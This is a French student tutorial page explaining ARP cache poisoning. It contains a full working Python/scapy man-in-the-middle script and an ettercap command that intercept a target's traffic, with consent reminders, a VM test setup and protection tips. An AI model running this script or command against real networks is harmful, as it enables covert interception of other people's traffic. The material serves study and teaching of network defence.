<!doctype html><html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="robots" content="index, follow"><link rel="canonical" href="https://do-it.aioli.ec-m.fr/promos/2022-2023/Adelain-thibault/mon/temps-2.1/"><meta name="description" content="Do-It, cours et travaux des √©l√®ves de l&#39;√©cole Centrale M√©diterran√©e"><meta property="og:description" content="Do-It, cours et travaux des √©l√®ves de l&#39;√©cole Centrale M√©diterran√©e"><meta name="twitter:description" content="Do-It, cours et travaux des √©l√®ves de l&#39;√©cole Centrale M√©diterran√©e"><meta name="author" content="Thibault Adelain"><meta name="keywords" content="do-it, centrale, centrale m√©diterran√©e, ecm, MON, arp, arp spoofing, arp poisoning, wifi, s√©curit√© informatique"><link rel="icon" href="https://raw.githubusercontent.com/do-it-ecm/do-it/main/src/assets/img/logo/favicon.ico" type="image/x-icon"><link rel="icon" href="https://raw.githubusercontent.com/do-it-ecm/do-it/main/src/assets/img/logo/minimal.png" type="image/png"><link rel="apple-touch-icon" href="https://raw.githubusercontent.com/do-it-ecm/do-it/main/src/assets/img/logo/minimal.png"><link href="/assets/stylesheets/main.css" rel="stylesheet"><meta property="og:title" content="ARP spoofing : attaque sur un r√©seau wifi"><meta property="og:image" content="https://raw.githubusercontent.com/do-it-ecm/do-it/main/src/assets/img/logo/intermediate-text.png"><meta property="og:url" content="https://do-it.aioli.ec-m.fr/promos/2022-2023/Adelain-thibault/mon/temps-2.1/"><meta property="og:type" content="website"><meta name="twitter:card" content="https://raw.githubusercontent.com/do-it-ecm/do-it/main/src/assets/img/logo/intermediate-text.png"><meta name="twitter:title" content="ARP spoofing : attaque sur un r√©seau wifi"><meta name="twitter:image" content="https://raw.githubusercontent.com/do-it-ecm/do-it/main/src/assets/img/logo/intermediate-text.png"><meta name="twitter:url" content="https://do-it.aioli.ec-m.fr/promos/2022-2023/Adelain-thibault/mon/temps-2.1/"><title>ARP spoofing : attaque sur un r√©seau wifi</title><link href="https://cdn.jsdelivr.net/npm/prismjs/plugins/toolbar/prism-toolbar.min.css" rel="stylesheet"><link id="prism-theme" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism-solarizedlight.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/prismjs/plugins/line-numbers/prism-line-numbers.min.css" rel="stylesheet"><script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script><script defer="">const storedTheme=localStorage.getItem("theme");function loadPrismTheme(e){const t=e?"prism-okaidia.min.css":"prism-solarizedlight.min.css",s=document.createElement("link");s.rel="stylesheet",s.id="prism-theme",s.href=`https://cdn.jsdelivr.net/npm/prismjs/themes/${t}`,s.onload=()=>{Prism.highlightAll()};const m=document.getElementById("prism-theme");m?document.head.replaceChild(s,m):document.head.appendChild(s)}function setMermaidTheme(e){const t=e?"dark":"forest";mermaid.initialize({securityLevel:"loose",theme:t,startOnLoad:!0})}function toggleDarkMode(){const e=document.documentElement.classList.contains("dark"),t=e?"light":"dark";localStorage.setItem("theme",t),document.documentElement.classList.toggle("dark",!e),loadPrismTheme(!e),setMermaidTheme(!e)}storedTheme?document.documentElement.classList.toggle("dark","dark"===storedTheme):document.documentElement.classList.toggle("dark",window.matchMedia("(prefers-color-scheme: dark)").matches);const isDark=document.documentElement.classList.contains("dark");loadPrismTheme(isDark),setMermaidTheme(isDark)</script></head><body data-prismjs-copy="üìã" data-prismjs-copy-error="‚ùå" data-prismjs-copy-success="‚úÖ" data-prismjs-copy-timeout="1000" class="bg-neutral-50 text-neutral-950 dark:bg-neutral-900 dark:text-neutral-50"><header class="fixed top-0 z-50 w-full border-b-2 border-gray-200 bg-white dark:bg-neutral-900 dark:border-neutral-700"><div class="max-w-[1000px] mx-auto px-4"><div class="min-h-[50px] flex justify-between items-center"><a class="mx-2" href="/">Home</a> <button class="hidden sm:block text-neutral-950 dark:text-neutral-50 hover:bg-neutral-700 hover:text-neutral-50 hover:dark:bg-neutral-300 hover:dark:text-neutral-950 transition-colors p-2 rounded-full duration-800 ease-in-out" onclick="toggleDarkMode()"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="h-5 aspect-square fill-none aspect-square stroke-2 dark:hidden stroke-current"><circle cx="12" cy="12" r="5"></circle><path d="M12 2V4" stroke-linecap="round"></path><path d="M12 20V22" stroke-linecap="round"></path><path d="M4 12L2 12" stroke-linecap="round"></path><path d="M22 12L20 12" stroke-linecap="round"></path><path d="M19.7778 4.22266L17.5558 6.25424" stroke-linecap="round"></path><path d="M4.22217 4.22266L6.44418 6.25424" stroke-linecap="round"></path><path d="M6.44434 17.5557L4.22211 19.7779" stroke-linecap="round"></path><path d="M19.7778 19.7773L17.5558 17.5551" stroke-linecap="round"></path></svg> <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="h-5 aspect-square fill-none aspect-square stroke-2 stroke-current hidden dark:block"><path d="M3.32031 11.6835C3.32031 16.6541 7.34975 20.6835 12.3203 20.6835C16.1075 20.6835 19.3483 18.3443 20.6768 15.032C19.6402 15.4486 18.5059 15.6834 17.3203 15.6834C12.3497 15.6834 8.32031 11.654 8.32031 6.68342C8.32031 5.50338 8.55165 4.36259 8.96453 3.32996C5.65605 4.66028 3.32031 7.89912 3.32031 11.6835Z" stroke-linecap="round" stroke-linejoin="round"></path></svg></button><div class="flex items-center gap-4 sm:gap-6"><a class="" href="/cs">CS</a> <a class="" href="/pok">POK</a> <a class="" href="/mon">MON</a> <a class="" href="/projets">Projets</a> <a class="hidden sm:block" href="/promos">Promos</a> <a href="/search"><svg class="h-5 aspect-square stroke-neutral-950 dark:stroke-neutral-300 fill-none stroke-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg> </a><a class="hidden sm:block" href="https://github.com/do-it-ecm/do-it" target="_blank"><svg class="h-5 aspect-square dark:stroke-neutral-300 dark:fill-neutral-300" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a></div></div></div></header><main class="mt-[66px] max-w-[1000px] mx-auto px-4" data-pagefind-body=""><article class="relative"><h1 class="mb-1">ARP spoofing : attaque sur un r√©seau wifi</h1><div class="mb-4"><div class="px-4 flex flex-wrap items-center"><div class="font-bold">Tags :</div><ul class="flex flex-wrap overflow-auto not-prose list-none my-1 mx-0 px-1 gap-1" data-pagefind-meta="Tags"><li class="bg-yellow-200 rounded-full px-2 text-neutral-950" data-pagefind-filter="Tags">MON</li><li class="bg-yellow-200 rounded-full px-2 text-neutral-950" data-pagefind-filter="Tags">arp</li><li class="bg-yellow-200 rounded-full px-2 text-neutral-950" data-pagefind-filter="Tags">arp spoofing</li><li class="bg-yellow-200 rounded-full px-2 text-neutral-950" data-pagefind-filter="Tags">arp poisoning</li><li class="bg-yellow-200 rounded-full px-2 text-neutral-950" data-pagefind-filter="Tags">wifi</li><li class="bg-yellow-200 rounded-full px-2 text-neutral-950" data-pagefind-filter="Tags">s√©curit√© informatique</li></ul><div class="hidden" data-pagefind-meta="Type" aria-hidden="true"><span data-pagefind-filter="Type">MON</span></div></div><div class="px-4 flex flex-wrap items-center"><div class="font-bold">Auteur :</div><ul class="flex flex-wrap not-prose list-none my-1 mx-0 px-1 gap-1" data-pagefind-meta="Auteurs"><li class="bg-blue-200 rounded-full px-2 text-neutral-950" data-pagefind-filter="Auteurs">Thibault Adelain</li></ul></div><div class="absolute top-0 right-0"><span class="bg-purple-200 rounded-full px-3 py-1 mt-2 mr-2 text-neutral-950" data-pagefind-filter="Ann√©e">2022-2023</span></div></div><div class="quote relative py-2 drop-shadow rounded rounded-tl-none rounded-bl-none border-solid border-l-8 border-purple-500 bg-purple-100 dark:border-purple-800 dark:bg-purple-950"><svg class="absolute w-7 h-7 pl-1 pt-0.5 pb-0.5 fill-none stroke-2 stroke-purple-500 dark:stroke-purple-800" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 19a2 2 0 01-2-2V7a2 2 0 012-2h4l2 2h4a2 2 0 012 2v1M5 19h14a2 2 0 002-2v-5a2 2 0 00-2-2H9a2 2 0 00-2 2v5a2 2 0 01-2 2z"></path></svg><div class="pl-8 mr-8"><a href="/promos/2022-2023/Adelain-thibault/">Thibault Adelain</a><span class="px-1">/</span><a href="/promos/2022-2023/Adelain-thibault/mon/">MONs de Thibault</a><span class="px-1">/</span><a href="/promos/2022-2023/Adelain-thibault/mon/temps-2.1/">ARP spoofing : attaque sur un r√©seau wifi</a></div></div><ul><li>ARP spoofing : attaque sur un r√©seau wifi</li><li>Niveau : interm√©diaire</li></ul><p>Rappel : Il faut avoir l'accord de la personne cible et de l'administrateur r√©seau pour r√©aliser un ARP spoofing. Il faut s'en tenir √† des pratiques √©thiques et de ne pas utiliser ses connaissances pour causer des dommages ou enfreindre la loi.</p><h2 id="arp-spoofing-%3A-un-type-d'attaque-mitm" tabindex="-1"><a class="header-anchor" href="#arp-spoofing-%3A-un-type-d'attaque-mitm"></a> ARP spoofing : un type d'attaque MITM</h2><p>L'ARP spoofing (ARP poisoning, ARP cache poisoning) est une attaque de type <em>Man In The Middle</em> (MITM). Sur un r√©seau local (LAN), le but de ce type d'attaque est de se placer entre la cible et le router. Ainsi, toutes les requ√™tes envoy√©es par la cible pour acc√©der √† internet (qui transite normalement par le router), passeront √† la machine de l'attaquant. Souvent, l'attaquant redirige ensuite le trafic vers le router qui envoie les requ√™te de l'utilisateur sur internet. L'attaquant agit comme un interm√©diaire, et peut alors espionner tout le trafic r√©seau de la machine cible.</p><p><img src="https://raw.githubusercontent.com/do-it-ecm/promo-2022-2023/refs/heads/main//Adelain-thibault/mon/temps-2.1/man-in-the-middle-attack.jpg" alt="man in the middle"></p><p>En particulier, l'ARP cache poisoning consiste √† utiliser une faille du protocole ARP afin se faire passer pour le router aupr√®s de la machine cible.</p><h2 id="arp-spoofing-%3A-protocole-arp" tabindex="-1"><a class="header-anchor" href="#arp-spoofing-%3A-protocole-arp"></a> ARP spoofing : protocole ARP</h2><h3 id="d%C3%A9finition" tabindex="-1"><a class="header-anchor" href="#d%C3%A9finition"></a> D√©finition</h3><p>ARP (Address Resolution Protocol) est un protocole utilis√© pour r√©soudre les adresses IP en adresses MAC (Media Access Control) dans les r√©seaux locaux. En effet, dans un r√©seau local les machines communiquent entre elles en utilisant les adresses MAC, et non les adresses IP. Pourquoi cela ? Pour plusieurs raisons en fait.</p><p>Les adresses MAC sont plus efficaces et plus fiables que les adresses IP : les adresses MAC sont des adresses physiques, qui sont uniques et qui ne changent pas, contrairement aux adresses IP qui peuvent √™tre dynamiques et qui peuvent changer (cf le protocole <a href="https://fr.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">DHCP</a>). Les adresses MAC sont stock√©es sur les puces r√©seau des appareils et sont utilis√©es pour communiquer au niveau de la couche 2 (couche liaison de donn√©es) du mod√®le OSI. Donc en utilisant l'adresse MAC pour communiquer, les machines √©vitent les probl√®mes de r√©solution d'adresses qui peuvent se produire lorsque les adresses IP sont dynamiques ou lorsque des appareils sont d√©plac√©s d'un sous-r√©seau √† un autre.</p><p>De plus, L'utilisation des adresses MAC permet aux machines de communiquer directement entre elles sur le r√©seau local sans avoir √† passer par un serveur de r√©solution d'adresses ou un routeur pour d√©terminer l'adresse physique de la machine destinataire. Cela permet de r√©duire la charge sur les routeurs et les serveurs, et d'√©viter de surcharger le r√©seau.</p><h3 id="%C3%A9tapes-de-communication" tabindex="-1"><a class="header-anchor" href="#%C3%A9tapes-de-communication"></a> √âtapes de communication</h3><p>Lorsque vous envoyez un paquet √† une machine, il faut d'abord r√©soudre son adresse MAC.</p><p>Pour r√©soudre une adresse MAC d'un autre appareil sur le m√™me r√©seau local, une machine envoie des requ√™tes ARP en broadcast (√† toutes les machines du r√©seau) et demande : &quot;A qui correspond l'adresse IP 192.168.0.13 ? Dites le √† 192.168.0.1&quot;, et la machine ayant cette adresse r√©pond : &quot;√Ä moi, 192.168.0.13, voici mon adresse MAC : 5E:FF:56:A2:AF:15&quot;.</p><p><img src="https://raw.githubusercontent.com/do-it-ecm/promo-2022-2023/refs/heads/main//Adelain-thibault/mon/temps-2.1/wireshark_arp.png" alt="Wireshark Capture of ARP request/ reply"></p><p>Ensuite, son adresse mac est enregistr√© dans votre table ARP, contenant toutes les adresses IP et adresses MAC connues. Par exemple :</p><table><thead><tr><th style="text-align:center">IP address</th><th style="text-align:center">MAC address</th></tr></thead><tbody><tr><td style="text-align:center">192.168.0.1</td><td style="text-align:center">2E:A0:12:B2:A6:87</td></tr><tr><td style="text-align:center">192.168.0.13</td><td style="text-align:center">5E:FF:56:A2:AF:15</td></tr><tr><td style="text-align:center">192.168.0.15</td><td style="text-align:center">6C:A4:36:B7:D6:31</td></tr></tbody></table><p>Ainsi, √† chaque nouvelle requ√™te √† cette IP, plus besoin de faire de requ√™te ARP pour r√©soudre son adresse MAC.</p><p>Dans votre terminal :</p><pre class="language-bash line-numbers"><code>

# Pour visualisez votre table ARP :
arp -a


</code></pre><h3 id="faiblesse-du-protocole" tabindex="-1"><a class="header-anchor" href="#faiblesse-du-protocole"></a> Faiblesse du protocole</h3><p>La principale faiblesse du protocole ARP est l'absence de v√©rification d'authenticit√© : les paquets ARP ne sont pas chiffr√©s et ne contiennent pas de m√©canisme d'authentification, ce qui signifie qu'ils peuvent √™tre facilement falsifi√©s.</p><h2 id="arp-spoofing-%3A-exploitation-(arp-cache-poisoning)" tabindex="-1"><a class="header-anchor" href="#arp-spoofing-%3A-exploitation-(arp-cache-poisoning)"></a> ARP spoofing : exploitation (ARP cache poisoning)</h2><h3 id="concept" tabindex="-1"><a class="header-anchor" href="#concept"></a> Concept</h3><p>On consid√®re 192.168.0.1 comme le router, 192.168.0.13 comme la machine cible, 192.168.0.15 comme l'attaquant.</p><p>On peut donc envoyer un requ√™te ARP √† la machine cible. Requ√™te ARP vers la machine cible : &quot;l'adresse IP : 192.168.0.1 correspond √† l'adresse MAC : 6C:A4:36:B7:D6:31&quot;. C'est le principe de l'attaque ARP cache poisoning. Dans la table ARP de la machine cible, on vient de modifier l'entr√©e du router (192.168.0.1) et de remplacer l'adresse MAC du router par l'adresse MAC (6C:A4:36:B7:D6:31) de l'attaquant. On va faire la m√™me chose pour le router, pour que toutes les requ√™tes du router vers la machine cible transitent par l'attaquant. Requ√™te ARP vers le router : &quot;l'adresse IP : 192.168.0.13 correspond √† l'adresse MAC : 6C:A4:36:B7:D6:31&quot;.</p><p><img src="https://raw.githubusercontent.com/do-it-ecm/promo-2022-2023/refs/heads/main//Adelain-thibault/mon/temps-2.1/schema_arp_spoofing.png" alt="ARP spoofing"> Photo par <a href="https://levelup.gitconnected.com/man-in-the-middle-attack-part-1-arp-spoofing-6f5b174dec59">Dharmil Chhadva</a>.</p><h3 id="impl%C3%A9mentation" tabindex="-1"><a class="header-anchor" href="#impl%C3%A9mentation"></a> Impl√©mentation</h3><p><strong>Note</strong> : macOS poss√®de une fonctionnalit√© int√©gr√©e appel√©e &quot;ARP cache validation&quot; qui vise √† prot√©ger contre les attaques d'ARP spoofing en v√©rifiant la validit√© des entr√©es dans la table ARP. Cette attaque n'a pas fonctionn√© sur mes appareils macOS / iOS. Cependant, elle a fonctionn√© sur des windows / Linux.</p><p>On va utiliser Python et la biblioth√®que <a href="https://scapy.net/">scapy</a> qui permet de manipuler les paquets.</p><p>On va d'abord cr√©er une fonction qui renvoie l'adresse MAC de l'IP demand√©. Cela se fait en envoyant des paquets ARP en broadcast (ff:ff:ff:ff:ff:ff).</p><pre class="language-python line-numbers"><code>

import scapy.all as scapy
import time
import argparse

def get_mac(ip):
    arp_req_frame = scapy.ARP(pdst = ip)
    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc


</code></pre><p>Gr√¢ce √† la fonction spoof, on envoie un packet ARP qui va changer le cache ARP de machine cible. En effet, <code>scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)</code> permet d'envoyer un paquet √† la machine ayant l'IP <code>target_ip</code> et de remplacer, dans sa table ARP √† la ligne <code>spoof_ip</code>, l'adresse mac r√©el par notre adresse MAC.</p><pre class="language-python line-numbers"><code>

# Our mac address is sent automatically in an ARP packet, so we don't need to precise hwsrc=our_mac in scapy.ARP
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(spoof_packet, verbose = False)


</code></pre><p>On fait une fonction restore pour r√©tablir les tables ARP initiales apr√®s avoir fini le spoofing.</p><pre class="language-python line-numbers"><code>

def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)


</code></pre><p>On ajoute argparse pour pouvoir parser des arguments en ligne de commande et on fait la boucle permettant de lancer l'ARP cache poisoning. <code>target_ip</code> correspond √† l'IP de la machine cible et <code>gateway_ip</code> correspond √† l'IP du router.</p><p>Le code entier donne :</p><pre class="language-python line-numbers"><code>

import scapy.all as scapy
import time
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    options = parser.parse_args()
    if not options.target_ip:
        #Code to handle if an IP Address of the target is not specified.
        parser.error("[-] Please specify an IP Address of the target machine, use --help for more info.")
    elif not options.gateway_ip:
        #Code to handle if an IP Address of the gateway is not specified.
        parser.error("[-] Please specify an IP Address of the gateway, use --help for more info.")
    return options

def get_mac(ip):
    arp_req_frame = scapy.ARP(pdst = ip)
    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(spoof_packet, verbose = False)
    
def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)
  
packets_sent = 0

options = get_args()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent += 2
        print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
        time.sleep(2)
        
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


</code></pre><h3 id="tests-et-finitions" tabindex="-1"><a class="header-anchor" href="#tests-et-finitions"></a> Tests et finitions</h3><p>Tester seulement sur des appareils et des r√©seaux wifi dont vous avez l'autorisation. ARP spoofing est certes intrusif sur l'appareil cible, mais peut aussi saturer le r√©seau local. √âgalement, vous pouvez activer des syst√®mes de d√©tection d'intrusion.</p><p>Pour le test, nous allons utiliser une machine virtuel comme appareil cible. Vous pouvez aussi utliser l'appareil de votre choix. Je vous renvoie au MON <a href="../pentest">pentest</a> pour voir comment set-up la VM (utiliser l'OS de votre choix). Il faut par contre configurer le r√©seau sur <em>connection par pont</em> (cliquez sur une VM puis --&gt; config --&gt; r√©seau --&gt; acc√®s par pont).</p><p>On peut regarder les tables ARP sur nos machines (attaquant et cible) avec <code>arp -a</code>. Sur la machine cible :</p><table><thead><tr><th style="text-align:center">IP address</th><th style="text-align:center">MAC address</th></tr></thead><tbody><tr><td style="text-align:center">192.168.0.1</td><td style="text-align:center">2E:A0:12:B2:A6:87</td></tr><tr><td style="text-align:center">192.168.0.13</td><td style="text-align:center">5E:FF:56:A2:AF:15</td></tr><tr><td style="text-align:center">192.168.0.15</td><td style="text-align:center">6C:A4:36:B7:D6:31</td></tr></tbody></table><p>Lancer la commande suivante pour lancer l'arp spoofing (-t : target ; -g : gateway) :</p><pre class="language-python line-numbers"><code>

python3 arp_MITM.py -t 192.168.0.13 -g 192.168.0.1


</code></pre><p>Si tout se passe bien, les packets sont transmis. En refaisant la commande <code>arp -a</code> sur la VM cible:</p><table><thead><tr><th style="text-align:center">IP address</th><th style="text-align:center">MAC address</th></tr></thead><tbody><tr><td style="text-align:center">192.168.0.1</td><td style="text-align:center">6C:A4:36:B7:D6:31</td></tr><tr><td style="text-align:center">192.168.0.13</td><td style="text-align:center">5E:FF:56:A2:AF:15</td></tr><tr><td style="text-align:center">192.168.0.15</td><td style="text-align:center">6C:A4:36:B7:D6:31</td></tr></tbody></table><p>Voil√†, maintenant tous les paquets provenant de la machine cible passent par l'attaquant. On peut utiliser des outils de sniffing de paquets pour espionner les paquets de l'utilisateur. On pourra voir toutes les ressources auxquelles il acc√®de, et si les paquets ne sont pas chiffr√©s, on peut voir les donn√©es qui transitent.</p><p>En utilisant wireshark, on voit que la victime essaye de se connecter au serveur DNS de google (8.8.8.8) : <img src="https://raw.githubusercontent.com/do-it-ecm/promo-2022-2023/refs/heads/main//Adelain-thibault/mon/temps-2.1/wireshark_spoof.png" alt="wireshark_ICMP_no_response"></p><p>On voit que les paquets ICMP de la victime n'ont pas de r√©ponse. A ce stade, tous les paquets de la cible passent par l'attaquant. Mais l'attaquant ne fait rien de ses paquets : il faut rediriger ces paquets vers internet, et que tous les paquets √† destination de la cible lui parviennent en retour. L'attaque sera alors r√©ussi.</p><p>On rajoute les modules os et signal, le param√®tre <code>scapy.conf.iface = &quot;en0&quot;</code> (d√©pendant de votre configuration par pont, √† voir dans VMware), dans le try les instructions pour autoriser le port forwarding, et dans le except les instructions pour retourner √† l'√©tat initial. Voici le fichier final :</p><pre class="language-python line-numbers"><code>

import scapy.all as scapy
import time
import argparse
import os
import signal

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    options = parser.parse_args()
    if not options.target_ip:
        #Code to handle if an IP Address of the target is not specified.
        parser.error("[-] Please specify an IP Address of the target machine, use --help for more info.")
    elif not options.gateway_ip:
        #Code to handle if an IP Address of the gateway is not specified.
        parser.error("[-] Please specify an IP Address of the gateway, use --help for more info.")
    return options

def get_mac(ip):
    arp_req_frame = scapy.ARP(pdst = ip)
    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc
  
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(spoof_packet, verbose = False)
    
def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)
  
packets_sent = 0

options = get_args()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
scapy.conf.iface = "en0"

try:
    print("[*] Enabling IP forwarding")
    #Enable IP Forwarding on a mac
    os.system("sudo sysctl -w net.inet.ip.forwarding=1")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent += 2
        print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
        time.sleep(2)
    
        
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sudo sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)


</code></pre><p><strong>Note</strong> : D√©sactivez votre VPN, certains bloquent la retransmission de paquets.</p><p>L'attaque est maintenant r√©ussi : en plus d'avoir modifier le cache ARP de la victime, vous transferez tous ses paquets vers leur destinataire, et renvoyer la r√©ponse. Vous pouvez observer les connexions dans Wireshark. La cible ne se rendra compte de rien : tous ses paquets sont transf√©r√©s normalement de son point de vue.</p><p>Bien s√ªr, si la cible transf√®re ses paquets en utilisant TLS (ex: https), les paquets seront chiffr√©s. Mais vous pourrez tout de m√™me observer √† quel ressource la cible acc√®de, ce qui est un prob√®me s√©rieux de confidentialit√©. Et si le protocole n'est pas s√©curis√©, vous pourrez lire tous les messages en clair...</p><p>Par exemple, pour des paquets transmis avec FTP :</p><p><img src="https://raw.githubusercontent.com/do-it-ecm/promo-2022-2023/refs/heads/main//Adelain-thibault/mon/temps-2.1/wireshark_transmited.png" alt="wireshark_FTP"></p><p><strong>Ps</strong> : avec une machine virtuelle, vos paquets auront de toute fa√ßon √©t√© capt√© par wireshark, car ils passent par la carte r√©seau de votre machine h√¥te. Cette d√©monstration sur machine virtuelle est un peu artificielle mais permet de bien comprendre le processus. Elle serait tout √† fait similaire sur un appareil r√©el.</p><h2 id="avec-ettercap" tabindex="-1"><a class="header-anchor" href="#avec-ettercap"></a> Avec Ettercap</h2><p>Vous avez un tuto sur Ettercap et Wireshark assez facile <a href="https://www.youtube.com/watch?v=-rSqbgI7oZM&amp;ab_channel=NetworkChuck">ici</a>.</p><p><a href="https://en.wikipedia.org/wiki/Ettercap_(software)">Ettercap</a> est un logiciel de s√©curit√© r√©seau qui permet d'intercepter le trafic r√©seau. Il permet √©galement de faire des attaques de type arp spoofing, sans avoir √† impl√©menter quoi que ce soit. Avec la commande suivante :</p><p><code>sudo ettercap -T -S -i en0 -M arp:remote /&lt;gateway-ip&gt;// /&lt;target-ip&gt;//</code></p><p>-T : text -S : sans SSL -i : pr√©cisez votre interface r√©seau -M : mode</p><p>Tout le trafic est intercept√© et redirig√© ; vous pouvez observer tous les paquets simplement dans wireshark (fiters : ip.addr = &lt;<em>target-ip</em>&gt; ; http ; TLS... amusez-vous !).</p><h2 id="pour-se-prot%C3%A9ger" tabindex="-1"><a class="header-anchor" href="#pour-se-prot%C3%A9ger"></a> Pour se prot√©ger</h2><p>Vous √™tes tr√®s vuln√©rable sur un r√©seau wifi public. Quelques recommandations :</p><ul><li>Utilisez un VPN, vos paquets seront chiffr√©s.</li><li>Ne partagez pas votre code wifi √† n'importe qui, et s√©curisez votre r√©seau wifi.</li><li>Certains anti-virus / logiciels de s√©curit√© bloquent les paquets ARP douteux.</li><li>Il existe des IDS bloquant les paquets ARP douteux.</li><li>...</li></ul><p><em>Surtout, ne pratiquez pas sans l'accord de la cible et de l'administrateur r√©seau !</em></p><h2 id="sources" tabindex="-1"><a class="header-anchor" href="#sources"></a> Sources</h2><ul><li>Dharmil Chhadva : Man In The Middle Attack (MITM) Part 1 ‚Äî ARP Spoofing : <a href="https://levelup.gitconnected.com/man-in-the-middle-attack-part-1-arp-spoofing-6f5b174dec59">https://levelup.gitconnected.com/man-in-the-middle-attack-part-1-arp-spoofing-6f5b174dec59</a></li><li>rameshaditya2001 : Python ‚Äì How to create an ARP Spoofer using Scapy? : <a href="https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/">https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/</a></li><li>Florian Burnel : Virtualisation ‚Äì Les types de connexion au r√©seau : <a href="https://www.it-connect.fr/virtualisation-les-types-de-connexion-au-reseau#IV_Le_type_Host-Only">https://www.it-connect.fr/virtualisation-les-types-de-connexion-au-reseau#IV_Le_type_Host-Only</a></li><li>Ismail Akkila : Black Hat Python ‚Äî ARP Cache Poisoning with Scapy : <a 